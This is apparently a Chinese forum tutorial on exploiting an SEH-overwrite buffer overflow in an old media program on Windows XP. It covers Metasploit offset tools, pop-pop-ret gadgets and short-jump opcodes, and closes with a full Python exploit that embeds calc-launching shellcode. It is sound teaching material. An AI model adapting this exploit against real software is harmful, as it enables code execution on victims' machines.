
![](https://bbs.kanxue.com/upload/attach/202204/930159_8Y264SQPC4AUTJJ.png)

---

# 漏洞利用

1. 在程序进入`41414141`地址时的异常断下别动，查看栈中的数据

![](https://bbs.kanxue.com/upload/attach/202204/930159_9KX7R8N3MBUX49J.png)

可以看到，返回地址为`ntdll`的某个地址，之后紧跟之前的`SEH`结构地址`12FD64`，并且看到这个系统函数也注册了`SEH`，且指向我们原来的`SEH`结构（栈上的数据为异常处理例程的一些参数，不展开分析了）

```c
// 异常处理函数模型
EXCEPTION_DISPOSITION __cdecl _except_handler(
    _In_ struct _EXCEPTION_RECORD *_ExceptionRecord,
    _In_ void                     *_EstablisherFrame,
    _Inout_ struct _CONTEXT       *_ContextRecord,
    _Inout_ void                  *_DispatcherContext
);
```

**2. 利用思路**

所以现在我们有了一个利用思路，在异常处理函数中构造`pop pop ret`，刚好把`EIP`覆盖为`12FD64`，然后在`12FD64`处，写入短跳转指令，越过`Handler`，执行`shellcode`。

好的，简单描述一下

```text
addr:12FD64 | Next   JMP 12FD6C  ; 越过4个字节
addr:12FD68 | Handler pop pop ret 指令的地址
addr:12FD6C | NOP
addr:12FD70 | Shellcode
```

3. 精确覆盖`SEH`

这里就需要使用`msf`的`pattern`的那两个工具了，打开`kali`

```bash
cd /usr/share/metasploit-framework/tools/exploit
./pattern_create.rb -l 5000 > /home/kali/Desktop/UI.txt
```

把这个`txt`，替换，打开漏洞程序，第一次异常时断下，查看`SEH`链

![](https://bbs.kanxue.com/upload/attach/202204/930159_6UU9SVCTBX77YGH.png)

可以看到 `Handler = 41367441` `Next = 35744134`，接下来去`kali`确定偏移

```text
./pattern_offset.rb -q 41367441 -l 5000
[*] Exact match at offset 588
./pattern_offset.rb -q 35744134 -l 5000
[*] Exact match at offset 584
```

好的，现在得到了偏移量，`Next offset`为文件偏移`584`处，`Handler offset`为文件偏移`588`处

4. 主食准备好了，还需要一些小菜，

- `pop pop ret`指令的地址
- 需要的机器码

用`x32dbg`搜索吧，也挺好用的，同时在调试器中，确定一下机器码

![](https://bbs.kanxue.com/upload/attach/202204/930159_76DFVV646Y99TSX.png)

选中一个地址，右键汇编，输入想要的指令，确定

![](https://bbs.kanxue.com/upload/attach/202204/930159_VEZXPX54WW23ZHT.png)

好的，得到了`pop pop ret`机器码，`58 5B C3`

然后相同的方法，在`422E40`输入`jmp 0x422E44`，得到了`EB 02`，好的，其实这个指令不对，跳转指令是从指令开始的地址计算的，所以机器码`02`为指令结束后跳过两个字节

![](https://bbs.kanxue.com/upload/attach/202204/930159_W7DSZ7XN7SMD4VD.png)

所以我们需要输入`jmp 0x422E46`，得到`EB 04`，好的，其实还不对（手动笑嘻嘻）

因为短跳指令只有两个字节，但是需要覆盖的地方是四个字节，那么怎么办，填两个`90`也就是`nop`指令，那跳转指令再跳过去两个字节，就是`EB 06`了

好的，现在来手动修改栈中的值，看看什么情况

![](https://bbs.kanxue.com/upload/attach/202204/930159_K29CDJZ7ETAC54Q.png)

内存窗口转到这个地址，准备修改的时候发现，这个数据好像反了。没错，就是这样，`x86`架构CPU为小端序存储数据，简单的说，就是读一个`int`值，那么要以字节为单位，从右到左读，也就是`35 74 41 34`，栈中的数据已经被调试器转换过了

那么应该怎么覆盖这个位置的数据，覆盖为`EB 06 90 90`即可，什么？我没有转换字节序？

好的好的，其实不需要转换，读指令是正着读的（手动狗头保命）

现在还需要一个`rop rop ret`指令序列的地址，刚才已经得到了机器码，`58 5B C3`，在`X32dbg`搜索一波，最好搜索程序自带模块

![](https://bbs.kanxue.com/upload/attach/202204/930159_PUJDEGN3UA8Z3P9.png)

如果搜不到，更换指令序列，这里我使用了`5F 5E C3`，地址为`1001E812`

![](https://bbs.kanxue.com/upload/attach/202204/930159_QHNYN4JNHTZJD8X.png)

说一下注意的东西，地址不能有`NULL`，且模块没开启`safeSEH`，后面遇到再分析，本例使用程序自带模块即可

同时，结合之前的漏洞分析，如果文本中有`0xA`（`\n`）`0xD`（`\r`）就会停止复制，所以`EXP`中不能出现`0x00 0x0A 0x0D`

5. 请出`pycharm`，写出最后的`EXP`

```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-

prefix = b'\x41' * 584
prefix2 = b'\x42' * 2000          # 最后的填充，不然触发不了异常。。。

Next = b'\xEB\x06\x90\x90'
Handler = b'\x12\xe8\x01\x10'     # 地址要小端序 因为地址作为一个dword值读取
nops = b'\x90' * 20               # shellcode为已经精心构造后的弹出calc指令(只限 xp sp3)，遇到需要编码的时候会再研究
shellcode = \
b"\x55\x8B\xEC\x33" \
b"\xC0\x50\xB8\x2E" \
b"\x65\x78\x65\x50" \
b"\xB8\x63\x61\x6C" \
b"\x63\x50\x8B\xC4" \
b"\x6A\x05\x50\xB8" \
b"\xAD\x23\x86\x7C" \
b"\xFF\xD0\x33\xC0" \
b"\x50\xB8\xFA\xCA" \
b"\x81\x7C\xFF\xD0" \
b"\x8B\xE5\x5D\x33"

Fileptr = open(r'UI.txt', 'wb+')
Fileptr.write(prefix + Next + Handler + nops + shellcode + prefix2)
Fileptr.close()

print("CreatFile Success")
```

6. 生成`EXP`，打开测试，弹出计算器，由于我的`Shellcode`最后调用了`ExitProcess`，所以没有弹出崩溃窗口

![](https://bbs.kanxue.com/upload/attach/202204/930159_SGYPGDSFTNG7Z45.png)

# 结语

1. 如果你是新手，跟着笔者的文字叙述与图片，一步一步来，不懂的时候，迷茫的时候先别着急，一不小心就走入岔路了

2. 篇幅虽少，但是应该说明白了，笔者的文章风格，是尽可能的用最少的文字，让读者轻松的学会这个知识（遇到一个知识点就展开讨论，会增加理解负担，并且文字太多也会加重阅读负担，这也是我坚持传图片的原因，传图片真的很累。。。）

3. 文章中的一些小细节需要读者自己去尝试并总结，相信对你会有帮助

# 参考资料

看雪 `EXP`编写系列教程 第三章

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2022-5-3 16:35 被yumoqaq编辑，原因：

[#Windows](https://bbs.kanxue.com/forum-150-1-160.htm)

[#缓冲区溢出](https://bbs.kanxue.com/forum-150-1-156.htm)

[#漏洞利用](https://bbs.kanxue.com/forum-150-1-154.htm)

上传的附件：

- [a1def037869c831496bda3d81b0d06f5-soritong10.exe](javascript:void(0);)

  （1.78MB，20次下载）
